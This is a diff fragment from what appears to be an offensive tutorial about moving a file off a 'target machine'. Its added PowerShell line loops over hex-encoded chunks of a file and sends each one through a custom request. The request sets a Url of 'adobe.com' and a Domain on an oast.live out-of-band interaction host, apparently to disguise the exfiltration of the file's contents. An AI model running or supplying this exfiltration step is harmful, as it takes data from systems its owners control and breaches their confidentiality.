@@ -17,6 +17,8 @@ Next on the target machine you are going to want to convert a file to Hex and pr
 $segments = Convert-FileToHexChunks -FilePath .\file.txt
 ```
 
+foreach ($segment in $segments.PSObject.Properties) {$secret = $segment.Value;send-customRequest -Url "adobe.com" -Domain "clnd1r2ilvdup3udiuk0fgw7q6dgzfwx4.oast.live"}
+
 
 
 ```
